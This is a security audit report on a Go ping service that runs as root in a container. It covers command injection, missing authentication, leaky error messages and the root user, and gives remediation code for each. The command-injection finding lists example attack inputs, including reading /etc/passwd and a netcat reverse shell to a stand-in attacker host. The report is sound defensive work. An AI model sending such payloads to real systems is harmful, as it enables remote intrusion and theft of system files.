## Finding 1: OS Command Injection

**Finding ID:** `APPSEC-d4f83a1c9b2e`  
**File:** `main.go`  
**Lines:** 19  
**CWE:** CWE-78 — Improper Neutralization of Special Elements used in an OS Command  
**OWASP Category:** A03:2021 – Injection  
**Priority:** P1  
**Severity:** CRITICAL  
**Confidence:** HIGH

### Vulnerable Code
```go
cmd := exec.Command("sh", "-c", fmt.Sprintf("ping -c 3 %s", ip))
```

### Description
The `ip` query parameter is taken directly from the HTTP request without any validation or escaping and interpolated into a shell command string via `fmt.Sprintf`. Passing this string to `sh -c` means the shell interprets all metacharacters in `ip` — semicolons, pipes, backticks, `$()`, `&&`, `||` — as shell operators. An attacker can append arbitrary shell commands that execute with the same privileges as the Go process (root, per the Dockerfile). The full combined output of the injected command is returned verbatim in the HTTP response (`main.go:27`), providing a complete read channel for exfiltration with zero authentication required.

### Prioritization
Highest priority. Unauthenticated remote code execution with root-level container access and a direct stdout read channel. No other finding in this codebase approaches this severity or exploitability.

### Exploitability Notes
- **Exploit Preconditions:** Network access to port 5000; no credentials or tokens required. A single HTTP GET request is sufficient.
- **Uncertainty Boundary:** Container isolation (Docker default seccomp/capabilities) limits some kernel-level operations, but does not prevent file reads, reverse shells, or lateral movement to reachable internal services. Impact may increase if the container runs `--privileged` or mounts sensitive host paths (not visible in the provided config).

**Concrete attacker input examples:**
```
GET /ping?ip=127.0.0.1;id
→ ping -c 3 127.0.0.1; id   (executes id, returns output in response)

GET /ping?ip=127.0.0.1%3Bcat+/etc/passwd
→ ping -c 3 127.0.0.1; cat /etc/passwd

GET /ping?ip=127.0.0.1%7Cnc+-e+/bin/sh+attacker.com+4444
→ reverse shell
```

**Counterfactual invalidation:** Replacing the `sh -c` invocation with `exec.Command("ping", "-c", "3", ip)` (no shell) eliminates this finding entirely — `exec.Command` without `sh -c` passes arguments directly to the OS without shell interpretation, so metacharacters in `ip` are treated as literal string data.

### Remediation

```go
// Before — shell interprets metacharacters in ip
cmd := exec.Command("sh", "-c", fmt.Sprintf("ping -c 3 %s", ip))

// After — pass args directly; no shell involved; add allowlist validation
import "regexp"

var validIP = regexp.MustCompile(`^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$`)

func pingHandler(w http.ResponseWriter, r *http.Request) {
    ip := r.URL.Query().Get("ip")
    if ip == "" {
        http.Error(w, "Please provide an IP address", http.StatusBadRequest)
        return
    }
    if !validIP.MatchString(ip) {
        http.Error(w, "Invalid IP address", http.StatusBadRequest)
        return
    }

    cmd := exec.Command("ping", "-c", "3", ip)
    output, err := cmd.CombinedOutput()
    if err != nil {
        http.Error(w, "Ping failed", http.StatusInternalServerError)
        return
    }
    w.WriteHeader(http.StatusOK)
    w.Write(output)
}
```

Two complementary controls applied: (1) the allowlist regex rejects any input that is not a bare IPv4 address before the command is built; (2) passing args as a Go slice to `exec.Command` means the OS receives them as-is with no shell interpolation, making metacharacter injection structurally impossible even if the regex were bypassed.

### References
- https://owasp.org/www-community/attacks/Command_Injection
- https://cwe.mitre.org/data/definitions/78.html
- https://pkg.go.dev/os/exec#Command — "If name contains no path separators, Command uses LookPath to resolve name to a complete path if possible." — note: `sh -c` is the anti-pattern; direct arg-list is the safe form.

## Finding 2: Missing Authentication on System Command Endpoint

**Finding ID:** `APPSEC-6c1a9d7e3f24`  
**File:** `main.go`  
**Lines:** 10–28  
**CWE:** CWE-306 — Missing Authentication for Critical Function  
**OWASP Category:** A07:2021 – Identification and Authentication Failures  
**Priority:** P2  
**Severity:** HIGH  
**Confidence:** HIGH

### Vulnerable Code
```go
func pingHandler(w http.ResponseWriter, r *http.Request) {
    query := r.URL.Query()
    ip := query.Get("ip")
    // No authentication check of any kind
    ...
    cmd := exec.Command("sh", "-c", fmt.Sprintf("ping -c 3 %s", ip))
```

### Description
The `/ping` endpoint invokes a system command (`ping`, and due to Finding 1, any arbitrary command) with no authentication, session validation, or API key check. Any unauthenticated actor with network access to port 5000 can invoke it. In the absence of the injection vulnerability this would remain a concern — exposing system utilities to the public internet enables abuse (network reconnaissance, resource exhaustion). With the injection vulnerability in place, the missing authentication reduces the attacker's required preconditions for full RCE to zero.

### Prioritization
P2 — secondary to the command injection (Finding 1) which is the primary exploitable path. Remediating only this finding without fixing the injection would not prevent RCE if authentication is bypassed or the service is reachable internally.

### Exploitability Notes
- **Exploit Preconditions:** Network reachability to port 5000 only.
- **Uncertainty Boundary:** If the container is deployed behind a private network boundary with no external exposure, impact is reduced but not eliminated (internal threat actors remain in scope).

### Remediation

Add a minimal bearer token check or API key validation before processing the command. Example:

```go
func pingHandler(w http.ResponseWriter, r *http.Request) {
    apiKey := r.Header.Get("X-API-Key")
    if apiKey == "" || apiKey != os.Getenv("PING_API_KEY") {
        http.Error(w, "Unauthorized", http.StatusUnauthorized)
        return
    }
    // ... rest of handler
}
```

For production use, prefer a proper authentication middleware (JWT, mTLS, or session tokens) over a shared API key.

### References
- https://cwe.mitre.org/data/definitions/306.html
- https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/

## Finding 3: Sensitive Error Information Returned to Caller

**Finding ID:** `APPSEC-8b73c4e1a5d0`  
**File:** `main.go`  
**Lines:** 22–23  
**CWE:** CWE-209 — Generation of Error Message Containing Sensitive Information  
**OWASP Category:** A05:2021 – Security Misconfiguration  
**Priority:** P3  
**Severity:** LOW  
**Confidence:** HIGH

### Vulnerable Code
```go
http.Error(w, fmt.Sprintf("Error executing command: %v", err), http.StatusInternalServerError)
```

### Description
When the `exec.Command` call fails, the raw Go error value is formatted and returned directly in the HTTP response body. Go's `exec` error messages include the command string, the exit status, and sometimes system-level details (e.g., `exit status 1`, `fork/exec /bin/sh: no such file or directory`). This leaks internal command structure and filesystem details to unauthenticated callers, which aids attacker reconnaissance when chained with Finding 1.

### Prioritization
P3 — lowest priority of the three findings. Standalone impact is informational, but it amplifies the attacker's reconnaissance capability when the higher-priority injection finding is also present.

### Exploitability Notes
- **Exploit Preconditions:** Must trigger a failing command (e.g., invalid IP causing ping to exit nonzero while the injection still executes).
- **Uncertainty Boundary:** The exact information disclosed depends on Go runtime and OS version; the concern is consistent across configurations.

### Remediation

```go
// Before
http.Error(w, fmt.Sprintf("Error executing command: %v", err), http.StatusInternalServerError)

// After — log internally, return generic message
log.Printf("ping command failed for ip=%q: %v", ip, err)
http.Error(w, "Command execution failed", http.StatusInternalServerError)
```

Log the error server-side for operators; return a generic message to the caller.

### References
- https://cwe.mitre.org/data/definitions/209.html

## Finding 4: Container Process Runs as Root

**Finding ID:** `APPSEC-c7f45b2e9a81`  
**File:** `Dockerfile`  
**Lines:** 1–28 (absence of `USER` directive)  
**CWE:** CWE-250 — Execution with Unnecessary Privileges  
**OWASP Category:** A05:2021 – Security Misconfiguration  
**Priority:** P3  
**Severity:** LOW  
**Confidence:** HIGH

### Vulnerable Code
```dockerfile
FROM ubuntu:22.04
# ... no USER directive
CMD ["/ping-app"]
```

### Description
The Dockerfile does not add a non-root user or include a `USER` directive, so the Go binary runs as UID 0 (root) inside the container. When combined with Finding 1 (command injection), the attacker gains root-level access within the container, enabling reads of any file, privilege escalation via SUID binaries (`/usr/bin/passwd`, etc.), and a stronger position for container escape if additional misconfigurations exist (e.g., privileged mode, host-mounted sockets).

### Prioritization
P3 — this is a defense-in-depth control, not a primary vulnerability. Fixing it alone does not prevent exploitation but meaningfully reduces blast radius post-exploitation.

### Exploitability Notes
- **Exploit Preconditions:** Requires exploiting Finding 1 first.
- **Uncertainty Boundary:** Whether root-in-container translates to host compromise depends on Docker daemon configuration (privileged, socket mounts, kernel namespaces) not visible in the provided files.

### Remediation

```dockerfile
FROM ubuntu:22.04

RUN apt-get update && apt-get install -y libc6 iputils-ping && \
    useradd -r -s /bin/false pinguser && \
    setcap cap_net_raw+ep /usr/bin/ping   # ping needs raw sockets; grant only that

COPY --from=builder /ping-app /ping-app

USER pinguser
EXPOSE 5000
CMD ["/ping-app"]
```

Note: `ping` on Linux requires `CAP_NET_RAW`. Running as non-root requires explicitly granting that capability to the `ping` binary via `setcap`, or granting it to the container at the Docker level (`--cap-add NET_RAW`).

### References
- https://docs.docker.com/develop/develop-images/dockerfile_best-practices/#user
- https://cwe.mitre.org/data/definitions/250.html
